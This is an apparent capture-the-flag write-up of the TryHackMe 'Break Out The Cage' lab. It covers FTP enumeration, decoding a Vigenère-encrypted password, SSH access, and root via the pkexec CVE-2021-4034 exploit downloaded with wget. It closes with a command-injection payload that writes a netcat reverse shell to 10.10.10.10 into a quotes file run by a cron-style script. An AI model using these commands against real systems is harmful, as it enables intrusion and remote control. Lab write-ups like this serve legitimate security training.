## Cage

Break Out The Cage

https://tryhackme.com/room/breakoutthecage1

## Enum
```
nmap -Pn -sC -sV -sT -T4 ip.thm -vv

Scanning ip.thm (10.10.22.98) [1000 ports]
Discovered open port 21/tcp on 10.10.22.98
Discovered open port 80/tcp on 10.10.22.98
Discovered open port 22/tcp on 10.10.22.98

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.95.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn+KLEDP81/6ceCvdFeDrLFYWSWc6UnOmmpiNeXuyr+GRvE5Eff4DOeTbiEIcHQkkPcz2QXiOLd9SMjCEgAqmZiZE/mv1HJpQfmRLOufOlf9oZ1TIZf7ehKcVqX0W3nuQeC+M2wLBse2lGhovnTSaZKLKRjQCP2yD1EzND/xFA88oFpahvr6vJfyGOTADjc83AJq9n3Gnil4Nd88xNsIKTl01Mm9ikE/3n/XFbwzYa2bYJRVr+lWWRd+EU3sYTY80PQgBiw6ZPT0QCe0lQfmcgCqu4hC+t/kyfmMRlbtjN/yZJ0gCWeVVAV+A4NNgsOqFbXUT+c6ATzYNhBXRojJED
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA3G1rdbZBOf44Cvz2YGtC5WhIHfHQhtShY8miCVHayvHM/9reA8VvLx9jBOa+iClhm/HairgvNV6pYV6Jg6MII=
|   256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiTPEbVpYmF2d/NDdhVYlXWA5PmTHhtrtlAaTiEuZOj
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ftp> open 10.10.212.70
Connected to 10.10.212.70.
220 (vsFTPd 3.0.3)
Name (10.10.212.70:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||33369|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||15363|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |*******************************************************************|   396        6.44 KiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (1.09 KiB/s)
ftp> exit
221 Goodbye.
```

```
file dad_tasks
dad_tasks: ASCII text, with very long lines (396), with no line terminators
```

```
cat dad_tasks
UWFwdy...........................................
```

```
echo 'UWFwdyUWFwdy...........................................' | base64 -d
```
```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!!
.............
```
![cage2](https://user-images.githubusercontent.com/6504854/187056101-f67c53ea-bc13-4ddd-80ab-29800c489f72.PNG)

![cage3](https://user-images.githubusercontent.com/6504854/187056105-1ca563e3-fd38-4762-870f-1dd8965c2ac8.PNG)
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... My********************************************
```
https://www.boxentriq.com/code-breaking/vigenere-cipher

## Flag

```
ssh weston@ip.thm
weston@ip.thm's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue Aug 23 04:42:52 2022 from 10.8.95.102
```
```
weston@national-treasure:~$  ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
weston@national-treasure:~$ wget http://10.10.10.10/1.tar
HTTP request sent, awaiting response... 200 OK

Length: 92160 (90K) [application/x-tar]
Saving to: ‘1.tar’

1.tar                       100%[===========================================>]  90.00K  92.7KB/s    in 1.0s

weston@national-treasure:~$ tar -xvf 1.tar

weston@national-treasure:~$ ./cve-2021-4034
# cat /root/root.txt
cat: /root/root.txt: No such file or directory

# cd /home/
# ls
cage  weston
# cd cage

# ls -la
total 56
-rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup

# cat Super_Duper_Checklist

# cd /root
# ls -la
total 52
drwxr-xr-x  2 root root  4096 May 25  2020 email_backup

# cd email_backup

# ls -la
total 16
-rw-r--r-- 1 root root  318 May 25  2020 email_1
-rw-r--r-- 1 root root  414 May 25  2020 email_2

# cat email_*
```

■ちゃんとやった場合

```
find / -user cage 2>/dev/null

/home/cage
/opt/.dads_scripts
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quotes
```

```
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py

#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

```
echo "AAA; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" > .quotes
```

Thank you for your time. Happy Hacking 😄

暑かった夏も終わりですね。。。 🍉😋🍉😋🍉😋🍉😋  
